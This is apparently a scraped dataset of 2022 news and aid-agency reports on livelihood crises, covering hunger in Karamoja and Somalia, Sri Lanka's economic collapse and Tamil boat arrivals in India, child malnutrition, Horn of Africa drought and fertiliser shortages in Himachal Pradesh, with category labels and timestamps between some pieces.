The food situation

Humanitarian agencies say 48 percent of the households have depleted their essential livelihood assets, including consuming seed stocks to cope with the situation.

“It is anticipated that the food security situation will slightly improve in the projection period (August 2022 – February 2023), with a reduction of the population in crisis level from 518,000 (41 percent) to 315,000 (25 percent),” the report says.

Data from IPC also indicates that only two (Kaboong and Moroto) of the nine districts in Karamoja region had critical levels of acute malnutrition during the lean season of 2022 (February to July). This translates into a level four rating, which usually requires emergency supplies. Elsewhere, four districts have serious levels of acute malnutrition and three districts have alert levels of acute malnutrition.

The Monitor understands that about 91,610 children aged six to 59 months and 9,453 pregnant or lactating women in the nine districts are affected by acute malnutrition and are in need of treatment.

The report says while Kaabong registered a 1.2 percent increase from the 18.6 percent prevalence recorded in 2021, the more worrying situation is in Moroto District that registered a 7.8 percent increase from 14.2 percent recorded in 2021.

It adds that in the projection period of August 2022 to January 2023, acute malnutrition is expected to improve in two districts—in one district from alert to acceptable, and in the other from serious to alert. The situation is expected to remain the same in other districts.

According to the report, of the nine districts analysed, Amudat, Kaabong, Kotido, Moroto, Nabilatuk and Napak are of concern in terms of both acute food insecurity and malnutrition.

Hungry population

Mr Marcus Prior, the Deputy Country Representative of the United Nations World Food Programme in Uganda, said all the nine districts of Karamoja are at crisis level of food insecurity or worse.

“In Karamoja, every 10 days, half of the population wakes up in the morning, knowing that they will not eat anything the entire day and night. Yet they must go out and find a way to generate income and look after their families,” he said, adding, “How are they supposed to survive when food, the very fuel of life, is not there?”

Mr Prior said there is need to give timely and simplified information on weather, knowledge on how to handle and store food as well as emergency support when hit by disasters. He also added that even in situations where relief supplements are given to severely malnourished children, food is shared by an entire family.

“Now is the time to put together our heads, pull together our resources, to stave off the perfect storm that is threatening to sweep off Karamoja. Without urgent funding, the situation will only get worse and lives will be lost,” Mr Prior forecasted. “We cannot just stand on dry land and watch our neighbour, Karamoja, drown. This should not be pushed to tomorrow, next year or next month. We must step up now.”

Guarded optimism

Ms Sacha Westerbeek, the chief communication officer at Unicef Uganda, said the situation in Karamoja is made worse by a number of interrelated challenges. These include climate change, which also contributes to the ongoing drought in the Horn of Africa, acute food insecurity, poor food consumption, insecurity, and high levels of malaria as well as diarrhoea.

“Together, these problems have put the lives of nearly 23,000 severely malnourished children at stake,” she noted, adding that her recent trip to Kaabong and Moroto a fortnight ago indicated that “the situation of children is expected to get much worse over the next few months.”

She said children with severe acute malnutrition are of special concern in situations like the one Karamoja is grappling with. Science indicates that they are up to 11 times more likely to die than well-nourished children.

“The good news is that acute malnutrition can be prevented…if prevention fails, it can still be treated through a package of key services,” she said, adding, “However, in order to marshal those services, we need urgent action and support.”

Mr Antonio Querido, the United Nations Foods and Agriculture Organisation (FAO) representative in Uganda, said it is evident that the last two years have been challenging due to numerous shocks that keep disrupting livelihoods, especially for the vulnerable communities.

He said Karamoja has heaped one disaster on the back of another, including desert locust infestation, animal disease outbreaks, cattle rustling and lately high insecurity.

“All these factors have eroded the gains earlier achieved through our resilience programming. There is a need for strategic partnerships and combined response because the situation of food security in Karamoja is deteriorating year after year,” he said.

Proactive approach needed

Mr Querido said a reactive approach should be eschewed for a proactive one where “[we] anticipate the increased risk and invest in strengthening early warning efforts at the national and community levels.” This, he added, will help them “capture real-time evidence to monitor an evolving risk with practical indicators to allow anticipatory and early decision-making to reduce the impact of an impending crisis.”

He said development partners and the government should invest in both emergency response and long-term solutions to resolve the hunger and malnutrition crisis in Karamoja.

“It is in this effort that FAO and partners are working closely with national and local governments to strengthen capacities to reduce, anticipate and rapidly respond to the effects of shocks and sustain climate-resilient rural development in Karamoja Sub-region,” he said.",Livelihood Crisis,2022-06-12 09:43:03

has been suffering from the worst in its history since gaining independence. The dire economic situation was caused by shortages of foreign currency as tourist flows dried up during the COVID-19 pandemic, preventing the country from purchasing enough fuel.

The pandemic has also negatively impacted remittances from Sri Lankans working abroad. There is an acute shortage of food and basic necessities, including fuel and gas, with many parts of the island nation facing lengthy power blackouts.

Faced with economic hardship, Colombo-based taxi and auto drivers are now forced to sell the national flag at the protest site Galle Face for their livelihood.

Piyal, who used to drive auto-taxi in Colombo, is now selling flags on the road for livelihood.

""I am basically an auto driver and due to shortage of petrol...and everyday curfew announcement by the government, I am selling flags on the road at the Galle Face protest site. Earlier, I earned around rupees 2500-3000 a day. But for several days, I did not earn enough from auto-taxi,"" Piyal told ANI.

Piyal has a family of four is now earning his livelihood by selling flags. As the country is facing economic uncertainty, Piyal himself is not sure about his future.

""Not able to earn much money by selling flags, but so far better than auto-taxi business. is facing very tough and difficult times. No gas, no food, and no diesel fuel are available. Tell me what we should do... How to run my family,"" he said.

On the occasion of the Vesak festival, the Galle Face protest site has been decorated, with anti-government protests continuing to press for the demand for Sri Lankan President Gotabaya Rajapaksa's resignation.

Auto taxi drivers selling the flag are thankful that the protest is counting in the Galle Face and people are finally buying the flag to participate in the anti-government protest site.

Another Sri Lankan, Nalinder, who is unhappy with the country's failing economy, reached at the Galle Face protest site. He works as a manager in an India-based company and bought a flag for his daughter as he feels for countrymen like Piyal.

""My country's economy is at its lowest level. We want to build our country's economy, so supporting my country and that's why my family is here at the protest site. I bought at least one flag from an auto driver who is selling flags because he is not able to manage fuel for their autos,"" Nalinder told ANI.

Nalinder believes it's the corrupt government and the mismanagement of politicians that has led the people of Sri Lankan to this crisis.

""Due to corrupt politicians, Sri Lanka is going down with the economy. They have to do many things but they are not doing enough for the country. That is why my country's economy is very bad now. The people of Sri Lanka want to change,"" he said.

Top 10 risks world faces today and in next 10 years (Courtesy: World Economic Forum)

Societal risks

Infectious diseases — which were categorised under the umbrella category of 'societal risks' — ranked sixth on the chart showing the top 10 severe global risks over the next 10 years.

Societal risks, overall, made up a third of the global top 10, with societal cohesion erosion and livelihood crises featuring among the top five.

""'Social cohesion erosion', 'livelihood crises' and 'mental health deterioration' are three of the five risks that have deteriorated the most globally through the crisis,"" the GRPS revealed.

Looming debt crises

The GRPS showed “debt crises” as an imminent threat to the world for the next two years. However, the respondents believed that they will reach their most critical point in 3-5 years.

The report suggested that a ""disorderly climate transition, characterised by divergent trajectories worldwide and across sectors, will further drive apart countries and bifurcate societies, creating barriers to cooperation.""

The report said, ""The risk horizon changes over the coming years, as the full implications of the pandemic become clearer.""

It said that by 2024, developing economies — except China — will have fallen 5.5 percent below their pre-pandemic expected GDP growth, while advanced economies will have surpassed it by 0.9 percent.

Risk experts said in the next two years, they ""see the erosion of social cohesion, the deterioration of mental health, infectious diseases and livelihood crises as being equal to environmental threats.""

According to the report, all these factors are constant across the short to long term.

In the next five years, debt crises and geo-economic confrontations are likely to emerge as governments struggle to balance fiscal priorities.

""On humanitarian grounds Sri Lankan Tamils need to be protected as a special case.","Dozens of poor families from Sri Lanka have fled to southern India over the past few weeks amid an acute economic and political crisis gripping the Indian Ocean island nation.

The country of 22 million people has been battling severe shortages of essential items, including food, fuel and medicine, as foreign reserves run dangerously low.

The resulting public fury targeting the government triggered mass street protests and political upheaval.

The resignation of Prime Minister Mahinda Rajapaksa and his Cabinet — and the appointment of a new prime minister — has done little to soothe public anger.

Armed soldiers are currently patrolling the streets to maintain order.

Embarking on perilous journey

Forty-one-year-old Rani, who asked that her real name not be used, told DW how eight of her family members, including small children, fled to India by boat to escape the economic misery.

Sri Lanka has been struggling with medicine, food, and fuel shortages for months

They sold the land they owned in Sri Lanka and rented a boat with that money. They traveled together with another family of four: a couple with their two children, aged 4 and one and a half.

""My husband and children could not find jobs. Every day the prices of food were increasing. My family needs at least 2 kilograms (4.4 pounds) of rice per day. The price we last paid for rice was around 250 Sri Lankan rupees (€0.65, $0.69) per kilo. We had to pay around 500 rupees per day for rice alone. We could not buy any other food items for our children,"" she said.

""My son has thalassemia. He has to eat nutritious food. I wanted to provide a better life for my children. That is why I decided to come to India,"" Rani said.

""We were scared that we would be caught by Sri Lankan authorities while we were crossing and be told to go back,"" she said. ""If we had been caught, all the money we had spent to rent the boat would have been for nothing. We were also scared of what awaited us in India.""

Sri Lankan Tamils hit hard by economic crisis

Indian authorities have so far recorded 28 Sri Lankan families, or 85 people, arriving via boat in southern Tamil Nadu state.

All of them belong to the Tamil community, an ethnic minority in Sri Lanka that shares deep social, cultural and linguistic ties with people in Tamil Nadu.

Sri Lankan Tamils, the largest ethnic minority in the island nation, accounting for about 12% of the population, have been struggling to recover from the decadeslong civil war that lasted until 2009, claiming around 100,000 lives.

Even some 13 years after the end of the war, reconciliation appears far off. And now the economic turmoil seems to be hitting them particularly hard.

""Even though the political and economic crisis in Sri Lanka is affecting all segments of society, there is an ethnic component to the harm Tamils are facing as a result of the crisis,"" Suraj Girijashanker, a specialist in international refugee law and assistant professor at the Jindal Global Law School, told DW.

He pointed out that Sri Lankan Tamils — particularly in areas which have been neglected by a series of Sinhalese-majority governments — are experiencing the economic hardship even more severely.

""Often we tend to treat economic harm in isolation, but the history and context in Sri Lanka complicates this picture as there is disparate impact on Tamils because of their ethnicity,"" he said.

'India needs a better refugee policy'

This is not the first time there has been an influx of people from Sri Lanka to India; Sri Lankan Tamils have been coming to India since the start of the civil war.

According to India's Home Ministry, there were 58,843 Sri Lankan Tamils residing across 108 refugee camps in Tamil Nadu as of 2021. Besides, around 34,135 refugees were staying outside the camps, registered with the state authorities.

Watch video 02:37 Sri Lanka's economic woes a result of 'Rajapaksa regime's incompetence'

India, however, is not a signatory to the 1951 Refugee Convention or the 1967 Protocol Relating to the Status of Refugees.

New Delhi also does not have domestic legislation regulating the entry and stay of people seeking asylum. It treats all those coming into the country seeking refugee status as illegal migrants under The Foreigners Act of 1946.

The UN Refugee Agency (UNHCR) is responsible for processing such people's applications and determining their status in India. Until then, they're handed a document that allows them to stay in the country.

But the document, a piece of blue paper, is widely dismissed by Indian authorities.

Without assistance from the Indian government, asylum-seekers and migrants find it immensely challenging to either rent homes or find work.

""India needs a national asylum law which prevents disparate standards for different refugee populations during different periods. Such a law may draw from the 1951 Refugee Convention, but also needs to keep the domestic conditions in mind,"" Girijashanker said.

The Mandapam refugee camp in Rameswaram is being used by Indian authorities to house those arriving from Sri Lanka

This view is shared by K.M.Parivelan, chairperson of the Center of Statelessness and Refugee Studies at the Tata Institute of Social Sciences, who also facilitated the voluntary repatriation of Sri Lankan civil war refugees in the past when he worked with the UNHCR.

""India needs a better refugee policy in line with international humanitarian and human rights frameworks,"" he told DW.

""On humanitarian grounds Sri Lankan Tamils need to be protected as a special case. We need to provide interim care and protection. Livelihood support can be given as a temporary measure and then they can be voluntarily repatriated to Sri Lanka,"" Parivelan said, stressing that, ""it should be voluntary repatriation in all circumstances.""

Stuck in the refugee camp

Indian authorities have been taking those arriving from Sri Lanka over the past couple of months to the Mandapam refugee camp in Rameswaram town.

""We have been staying here for more than a month now, with no end in sight. People who came two months before us are also facing the same situation,"" Rani said.

""My daughter-in-law is six months pregnant and weak. We have to get permission from the authorities to go for health checkups. We don't know how we are going to manage once the baby is born,"" she added.

Mani (not his real name), a 26-year-old man who used to work as a painter in Sri Lanka, reached India in March, along with his wife.

""We could not do anything in Sri Lanka because of the economic crisis. That's why I decided to come to India with my wife on a boat,"" he told DW.

""If I had known that we would be held in a refugee camp like this, I would not have come at all,"" he said, noting that they have been staying at the camp for over a month.

""We do not know what is going to happen to us,"" he said. ""If we are given some documentation by India, we can work and provide for our families. That is all we ask.""

The condition is also known severe wasting, which involves a low weight to height ratio and affects 45 million children under age 5.

Conflict and other crises around the world are affecting both food supply and the capacity of relief organisations to provide crucial aid, according to the report.

Speaking to The Journal, UNICEF Senior Adviser in Emergency Nutrition Saul Guerrero Oteyza said that the “combination of the tail-end of the socioeconomic impact of the pandemic, the conflict that is affecting many of these countries, as well as the knock-on effect of the Ukrainian conflict, and climate all come together in this perfect storm of factors”.

“Maternal and child nutrition is a function of the stability of the environment in which women and children live,” Guerrero Oteyza said.

“Any shock to that stability, whether it’s displacement because people have to move because of conflict, for example, or severe drought, or another rapid-onset crisis, upsets that balance.

“That balance has already been quite tenuous in many parts of the world over the last few years, but what we’re seeing now is those shocks coming in more regularly, those climate-related shocks coming more regularly, and more severely every time.

In the Horn of Africa, which includes countries like Djibouti, Ethiopia, Kenya, Eritrea, Somalia and Sudan, UNICEF has been tracking deteriorating climatic conditions for several years and the current situation is the product of a “severe cumulative effect”.

“The climate is not only leading people to be on the move and therefore to create those sorts of shocks that come with displacement, but the loss of livelihood left, right and centre,” Guerrero Oteyza said.

“When 30% of all the livestock in Somalia is considered to be now wiped out by the drought, it starts to give you a sense of the vulnerability that it creates.”

The new UNICEF report outlines that at least 10 million children suffering from severe wasting do not have access to ready-to-use therapeutic food (RUTF), which is considered the most effective treatment.

Global shocks to food security caused by Russia’s invasion of Ukraine, the pandemic, and persistent droughts due to climate change are increasing levels of severe wasting, it details.

At the same time, the price of ready-to-use therapeutic food is expected to increase by up to 16% by the end of the year because of a sharp rise in the cost of raw ingredients, with the cost of shipping and delivery also expected to remain high.

In a statement, UNICEF Executive Director Catherine Russell “for millions of children every year, these sachets of therapeutic paste are the difference between life and death,” Russell said.

“A 16% price increase may sound manageable in the context of global food markets, but at the end of that supply chain is a desperately malnourished child, for whom the stakes are not manageable at all.”

It’s estimated that an additional 600,000 children could be unable to access life-saving treatment at current spending levels.

Guerrero Oteyza said that access to water, supplementing diets, and facilitating breastfeeding are important measures that can help prevent child malnutrition.

“There are measures that can be taken at a financial level to give us the opportunity to respond earlier to some of these climate-related shocks, to prepare services, health services, food systems in these countries to withstand the climate-related shocks.”

He said how and where funding is directed is just as important as the amount that is raised.

“Business as usual isn’t going to cut it and sometimes the same amount of resources spent or provided in a slightly different way could go a long way in preparing us to deal with the climate effects,” he said.

“It’s not just a question of what we do, but how we are empowered to do these things that will make a huge difference.

“Earlier is the key, because we see these things brewing. The climate is moving, and it’s moving fast, but in many ways, in many parts of the world, it moves in predictable ways – there are seasons when you know it’s going to be worse.

“But right now, we don’t always have the capacity to act when we want, let alone how we want.

“If we could just make some difference in our collective capacity to operate and respond when we can and when we know it’s early enough to make a difference for those lives for those households and their livelihoods, we should.”",Livelihood Crisis,2022-05-17 07:00:00

Most of their animals have died along the way, and the few left are feeding on cactuses and other plants, even though they can be toxic to livestock, as a last resort.”

Across the Horn of Africa, some regions are facing their driest season in 40 years. Over 14 million people across Somalia, Ethiopia and Kenya—about half of them children—are already on the verge of starvation. In Somalia alone, over half a million people have already fled their homes in search of food and water since the start of 2022. Mercy Corps is responding to immediate needs by providing cash assistance, increasing access to water, and supporting pastoralist and farmer livelihoods—with an emphasis on building resilience beyond the current crisis.

We’re sharing stories from the communities in Somalia and Kenya that Mercy Corps is supporting. From our experience working in the Horn of Africa since 2004, we understand this won’t be the last drought to strike the region. We must take urgent action to avert a deepening crisis and help communities withstand future emergencies.

In a dusty lot on the outskirts of Somalia’s capital city, Mogadishu, displaced people live in a crowded camp. After losing crops, livestock, and family members to the drought, many of the displaced have walked for weeks to arrive at the camp.

“We saw the horrific consequencesof acting too late in Somalia in 2011, when over a quarter of a million people died as a result of drought and famine,” said Daud. “In 2017 however, the Somali government and humanitarian community prevented the worst impacts of drought by swiftly acting on early warning signals, showing that a collective ‘no-regrets’ approach to funding and programming can effectively avert famine. Now, more than ever, our shared responsibility must translate into action for communities in the Horn of Africa.”

South of the capital city, in Lower Juba, Daud met women who brought their children in search of support and now live in makeshift shelters in camps outside of nearby towns. Their husbands stayed behind to watch over the few remaining livestock. The camps have no food, access to water, or sanitation. The women and children are “exposed while relying on the little help the local communities offer,” said Daud. “It's a scramble for survival.”

Climate change has exacerbated the frequency and severity of droughts that have now left nearly 90% of Somalia in an extreme drought following three consecutive failed rain seasons. The drought crisis is further compounded by the COVID-19 pandemic, regional conflict, desert locusts, and now a surge in food prices due to the war in Ukraine. Mercy Corps is providing cash and food to the most affected families, and water in remote villages through emergency water trucking for communities and their livestock to help prevent a worsening catastrophe.

Women and girls bear the brunt of the impacts of the drought, due to prevailing gender inequality in the region. For instance, in times of crises, communities may use coping strategies like removing children from school, and girls are the first to miss out on their education. The displacement that results from drought can also lead to greater gender-based violence against women and girls. Schools not only provide education and access to water, but a sense of normalcy during a challenging time.

A person pulls water from deep in the earth at a migration water point in east samburu, kenya In Kenya, pastoralists are going to great lengths to save their livestock. Leparin Lolmongi pulls water from deep in the earth at a migration water point in East Samburu, Kenya, where dozens of other pastoralists have trekked for days—some from over 200 kilometers away—to reach a water source. His camels drink from a trough behind him. Leparin fills up bucket after bucket, knowing that he will need to store enough water for both himself and his animals for their onward journey. As a migratory pastoralist, Leparin’s camels are his livelihood. Due to the drought, and increasingly limited food supply, intercultural conflicts are also a risk factor in the area, making life more challenging for all.

A thriving water source once provided more than enough water for this Samburu woman and her community near the Lesepe Dam in Baragoi, Kenya. Now the women gather to pray for rain, after a year without it. Every day, she and other women—mothers and grandmothers—walk two kilometers from their village in scorching heat to the dam for this special ceremony. She pours a bit of water on weeds, symbolizing the women’s request for rainfall.

The women pray, sing, and splash milk in the air during the ritual. When the ceremony is completed, the women take refuge underneath canopying trees for shade, drinking sips of water to replenish themselves before making the journey back to their village. They will return to the dam on the next day, to pray again for rain.

I have to ration supper, and divide meals so that some of my children who need additional food are able to eat more than others,” saidsays Elizabeth.

Just a few months ago, her daughter was severely malnourished and received critical health care from this nearby clinic, which is supported in part by Mercy Corps. Her daughter receives regular health exams, malaria medication, and supplementary food during their visits.

With a cash grant from Mercy Corps, she opened a shop where she sells food and household items. As a participant in a Mercy Corps program promoting livelihoods for women, she also learned basic financial planning, bookkeeping, and business skills to help supplement lost income from drought-affected businesses. Livestock farming has diminished due to the drought, which means fewer customers for Abida. “If it doesn’t rain, the shop won’t survive,” said Abida.

The hope for rainfall is shared across the region as communities struggle with compounded crises. In order to meet urgent needs caused by the drought, Mercy Corps is increasing access to water, distributing cash assistance, and providing animal feed and veterinary care to pastoralists.

When their two-day-old daughter first refused to eat, then began to go yellow with the signs of jaundice and then fell into a seizure, Kanchana and her husband, living in the Sri Lankan region of Haldummulla, knew she needed urgent medical care.

But they faced a terrible obstacle. Sri Lanka is in the grip of the worst economic crisis in its history, declaring bankruptcy and with no foreign reserves left to pay for imports. As a result, the country has been unable to afford necessary fuel and in recent weeks, supplies have all but dried up. As the girl’s father searched for hours on Sunday for fuel for his tuk-tuk to drive her to hospital, he was faced with one empty petrol station after another.

Eventually, when they arrived at a local hospital just a few kilometres away, their two-day-old was in such a critical condition she had to be transferred to an emergency treatment unit at the larger Diyatalawa hospital. But it was too late; she was already dead on arrival.

Shanaka Roshan Pathirana, the judicial medical officer of the Diyatalawa hospital who conducted the postmortem, confirmed that the length of time in getting the infant to hospital had led directly to her death.

“The depressing memory for the parents that they could not save their baby just because they could not find a litre of petrol will haunt them for ever,” Pathirana said in a social media post, which accused the government of failing to protect the lives of vulnerable people.

Pathirana spoke directly to the Guardian to confirm the details of the incident but said he was not authorised to speak to the media beyond his social media post. Kanchana, the baby’s mother, said she was too distraught at her daughter’s death to say anything more.

It was a haunting reminder that as Sri Lanka’s economic crisis drags on without respite, the human cost continues to mount. The newly appointed prime minister, Ranil Wickremesinghe, warned last week: “the worst is still to come”, with medicine shortages worsening daily and food shortages predicted to be on the horizon. Already, many in the country can barely afford one meal a day as food inflation has soared to a record 45% and the country’s currency has become the worst-performing in the world.

Sri Lanka’s economic crisis has also precipitated a political crisis that continues to destabilise the country. President Gotabaya Rajapaksa, who is accused of catastrophic economic policies and mismanagement that drove the country to bankruptcy, has continued to refuse to bow to mass protests and resign. While a new prime minister was appointed this month, the government is seen by many as weak and without the backing of the people.

Nowhere are the woes of Sri Lanka more visible than the queues that continue to form outside petrol stations, often more than two miles long, long into the night as the island grapples with rampant fuel shortages and prices that have risen 137% over the past six months. For the drivers and tuk-tuk owners, petrol is their livelihood; without it they cannot survive. To worsen matters, on Tuesday the government announced an unprecedented fuel hike of 20-24% on petrol and 35-38% for diesel.

“No matter how much you work, it’s now never enough to cover the costs of the petrol,” said Ruwal Ranasinghe, 40, a tuk-tuk driver from Pethiyagoda.

As darkness fell over Colombo on Monday night, D M Sameera, 39, a driver from Kesbawa, about 15 miles away, settled in for what would be his 33rd hour waiting in a queue for petrol outside a station in the city’s Havelock town area.

His desperation was palpable. The previous morning he had driven to two different petrol stations and waited for hours, each time getting to the front of the queue just after petrol ran out. Eventually, he had parked outside this station on Sunday afternoon, kept there for more than 24 hours by the promise that petrol was definitely on the way imminently and the fact there was nothing left in his tank. But by 11pm on Monday, none had come and he was facing another night sleeping in his car as he waited for a tanker to arrive.

“I have to be away from my family for days now because during the day I work and at night I wait for petrol,” said Sameera. “Often I don’t have enough fuel to drive back home. This has made me feel fed up with my life and not wanting to go on. I am so angry and filled with hatred at the government for doing this to us.”

For the city’s tuk-tuk drivers, life has become what one described as “a living hell”, with every moment they are not working spent waiting in line for petrol, often until 3am or 4am, or sleeping overnight in line if they have “bad luck”. Their incomes have more than halved as a result, while petrol prices have skyrocketed.

“I don’t see my family any more: if I am not working I am just in my tuk-tuk waiting for petrol for up to eight hours a night,” said Mohammad Kamil, 38, as he sat outside a petrol station at 10pm. “I have lost so much sleep. It’s very sad, I cry alone in my tuk-tuk sometimes when I am waiting for petrol because it’s so desperate.”

As supplies of fuel have recently trickled in, donated by India and other neighbouring countries, a system has emerged to help people find petrol – including Facebook and WhatsApp groups dedicated to announcing where the latest fuel arrival has been dispatched.

In an attempt to maintain their family life, some tuk-tuk drivers resorted to desperate measures during their night-time fuel searches. In the back of Chanukah Pradeep’s tuk-tuk, which had sat in a petrol queue in Gamthaha district for hours, his two-year-old daughter lay curled up asleep next to his wife.

“I brought them with me here, because otherwise I don’t get to spend any time with my family,” said Pradeep, who works two jobs. “When I get back from the petrol queue they are both asleep, so at least this way I can be with them for a little bit of time.”

He looked mournfully at his daughter asleep in the tuk-tuk back seat, shifting restlessly as the huge diesel trucks honked their horns impatiently nearby and car fumes filled the air.

“I am so sad and full of regret that this is her life and that I am losing all this precious time with her for what? Just for petrol,” said Pradeep. “I will never get that time back.”

The harsh weather and lack of fertilisers have broken the backs of us farmers and gardeners,"" said Tulsi Ram Sharma, an farmer from Theog, .

""During the flowering season and when wheat crops and vegetables needed manure, there was no fertiliser available in the market. As a result, we suffered huge losses, which deepened our livelihood crisis. Our losses rose to 40 per cent due to lack of rains and non-availability of manure. This is the first time we've had to face two problems at the same time,"" added Sharma, who has spent the past five decades cultivating apples on 8 bighas of land in the vegetable- and apple-dominated region.

Grapes and geopolitics

This crisis is directly related to India's deteriorating relationship with China and is exacerbated by the ongoing Russo-Ukrainian war. This is because of disrupted supply from war-torn Ukraine, the world's largest exporter of urea fertilisers, said renowned agriculture expert Devinder Singh. He added that India's dependence on raw materials for fertilizer is mostly on China and Ukraine.

Speaking to 101Reporters, Ganesh Dutt, Chairman of the State Cooperative Marketing and Consumer's Federation (HIMFED) confirmed that the non-availability of raw materials from abroad had deepened the fertiliser crisis in and ""HIMFED has taken necessary steps to ensure availability"". In addition, Biofertilizers developed by the Agri-Horti universities in the state were also distributed to farmers and orchardists.

In Himachal, 69 per cent of the population is associated with agriculture and horticulture, which means around 9.61 lakh farmers and 2.5 lakh gardeners are directly affected by this shortage. plants need nitrogen before they flower, a requirement that's met by manure, whereas urea fertiliser is necessary to get a good yield of wheat. The severe deficit of both means poor quality of grains in the wheat crops and premature flowering of apples and other fruits in the heat.

Horticulture expert Dr S.P. Bhardwaj pointed out that the plants that go dormant in the winter are rejuvenated in the spring, and at this time, they are usually fed nutrients through manure. As a result, plants are fortified for the next crop cycle. This year, however, the entire crop cycle was disturbed.

HIMFED monopoly over procurement, distribution

HIMFED obtains fertilisers from firms across the country and ensures its supply to the farmers and gardeners of Himachal Pradesh through its cells. In places where HIMFED does not have its own centres, it supplies fertilisers through open depots under the public distribution system (PDS).

In fact, HIMFED alone sells 80 per cent of the fertilisers in the state. Till February 2022, it distributed 22,958 tonnes of manure among farmers and gardeners, whereas, in the same month last year, it made 74,604 tonnes of manure available to them. This meagre supply also led to significant inflation in the price of fertilisers. As a result, under the leadership of senior CPI-M leader and former mayor of Shimla Sanjay Chauhan, farmers and gardeners staged a protest against HIMFED selling fertilisers at higher prices than the open market.

HIMFED sells fertilizers throughout the year but farmers purchase it during the start of cropping seasons due to storage issues at their end.

Established by the state government, HIMFED shoulders the responsibility of buying and distributing fertilisers well in advance to prevent a shortage in supply. Under normal circumstances, farmers would visit HIMFED's centres and local PDS depots to procure fertilisers. The overall shortage this time meant their centres, too, were low in stock, so farmers and gardeners resorted to buying their manure from the open market. Besides HIMFED, no other agency supplies fertilisers directly, and only a certain amount of manure is sold through shops in the open market.

Beyond the apples

Besides apples, the quality of wheat crops also suffered due to the non-availability of fertiliser.

Bhag Singh, a wheat farmer from Una district, said his yield dropped by 10 per cent from that last year and that both small and medium farmers had suffered due to the manure shortage. He claimed to have visited the government depot every day for a week to look for urea fertiliser for his crop, but had returned empty-handed each time.

Similarly, Prem Singh, a gardener from Kullu district, said he worked with gardeners around his plot to collect manure for his plants, in an attempt to reduce crop loss.

Rising temperatures and inadequate rainfall, coupled with an extended dry spell, are the other culprits behind the plight of Himachal's farmers today. According to data from the weather bureau, recorded from 1901 to 2022, March 2022 was the hottest March of the century. Such harsh weather can wreak havoc on apple crops, which require low temperatures to flourish.

Horticulture expert Dr Kishore Sharma pointed out that the temperatures in 2022 have been several degrees above normal for this time of the year.

""This change in temperature will cause problems in the fruit setting in apple trees, which can reduce crop production by 15 per cent to 20 per cent. The quality of the fruit will also be affected as a result of not receiving the necessary nutrients. In both circumstances, gardeners may have to bear financial losses,"" Dr Sharma told 101Reporters.

The annual turnover of apples in Himachal is over Rs 4.5 thousand crore, but if the unfavourable weather conditions persist, the state's economic health is bound to take a hit.

Traditional farming practices the way forward

Over the last 17 months, India witnessed the highest food inflation rate, with F&B prices skyrocketing across the country. In such a situation, a shortage of manure will inadvertently affect the production of crops and fruits countrywide, leading to further inflation and slower GDP growth.

While it remains unclear how farmers and the HIMFED plan to tackle the prevailing crisis in Himachal Pradesh, a cursory look at the state of affairs would pave the way towards adopting methods of agriculture and gardening that minimise the use of fertilisers and pesticides. To help farmers take this route, in 2019-20, the central government launched the Bhartiya Prakritik Kheti Padhatti (BPKP) sub-scheme under the Paramparagat Krishi Vikas Yojana, which falls within the umbrella of National Mission on Sustainable Agriculture (NMSA) with a budget outlay of Rs 4645.69 crore till 2025 to promote organic and natural farming with the use of traditional practices.

The government of Himachal Pradesh had also launched the Prakritik Kheti Khushal Kisan Yojna in 2018, to discourage the use of pesticides. Adopting such methods of agriculture would not only lessen farmers' dependence on chemical fertilisers but also reduce expenditure.

Food assistance reached an average of 2.4 million people per month between February and April 2022 and has likely prevented the worsening of food security and nutrition outcomes in many areas.

However, humanitarian assistance delivery is far short of the rising level of need, and insufficient funding is expected to lead to pipeline breaks in food assistance delivery after June. Food insecurity and malnutrition are expected to deteriorate further and faster between June and September 2022, and if humanitarian food assistance is not scaled up and sustained, then approximately 7.1 million people (or 45% of the total population) are expected to face Crisis or worse (IPC Phase 3 or higher) outcomes. This figure includes 2.1 million people that will likely be in Emergency (IPC Phase 4) and at least 213 000 people that will likely be in Catastrophe (IPC Phase 5). In addition to the population groups that face an increased Risk of Famine, other areas of concern include Northern Inland Pastoral of Northwest, Hawd Pastoral of Northwest, Southern Agropastoral, Southern Rain-fed Agropastoral of Middle and Lower Juba, and Togdheer Agropastoral livelihood zones as well as IDP settlements in Burao, Lasaanod, Garoowe, Belet Weyne, Doolow and Kismaayo, all of which face Emergency (IPC Phase 4) between June and September 2022.

Based on the results from 11 integrated food security, nutrition and mortality surveys conducted between late April and early May 2022, the total acute malnutrition burden estimates for Somalia for 2022 have been revised and updated. Accordingly, as of May 2022, an estimated 1.5 million children under the age of five years (total acute malnutrition burden), representing 45 percent of the total population of children, face acute malnutrition through the end of the year, including 386 400 who are likely to be severely malnourished.

Urgent and timely scaling up of integrated humanitarian assistance is required to prevent extreme food insecurity and acute malnutrition, including starvation and excess mortality, in areas facing an increased Risk of Famine through at least September 2022. In particular, malnutrition and mortality outcomes in Baidoa and Burhakaba districts in Bay region already point to an extremely concerning situation as of May 2022. While only one of the criteria of Famine (IPC Phase 5) has been met in Baidoa district as of May, there is increasing concern that further deterioration in food consumption, acute malnutrition, and mortality may lead to Famine (IPC Phase 5) in these two districts if humanitarian assistance is not scaled up urgently in these areas. A new round of data collection will be undertaken in June to further assess the likelihood of Famine (IPC Phase 5) in Bay Region. Moreover, available long-range forecasts indicate that a record fifth below-average rainy season is likely across Somalia during the forthcoming October and December 2022 Deyr season. Therefore, humanitarian needs are expected to worsen and remain high nationally well into 2023.

The conclusions above are based on updated IPC and Famine Risk Analyses conducted in May 2022 by food security and nutrition experts drawn from the Ministry of Humanitarian Affairs and Disaster Management (MOHADM) of the Federal Government of Somalia (FGS), Food Security and Nutrition Analysis Unit (FSNAU/FAO), Famine Early Warning System Network (FEWS NET), World Food Programme (WFP VAM), United Nations Children’s Fund (UNICEF), Action Against Hunger (ACF), and the Somalia Food Security and Nutrition Clusters, with the technical support of the Integrated Food Security Phase Classification Global Support Unit (IPC GSU).

A multi-season drought that began in Somalia in late 2020 has continued to worsen through May 2022, leading to further deterioration of the food security and nutrition situation across many parts of the country. Persistent insecurity and conflict– particularly in central and southern Somalia, as well as global supply and price shocks, are further exacerbating the food insecurity situation in Somalia. While the current Gu (March/April-June) rains marginally replenished pasture and water resources in some locations, widespread water and pasture scarcity persists. Over three million livestock are estimated to have died since mid-2021 due to starvation and disease. Four consecutive poor or failed harvests since 2020, escalating local and imported food prices, and drought and conflict-induced population displacement are all leading to a decline in the coping capacity of poor and vulnerable populations across Somalia.

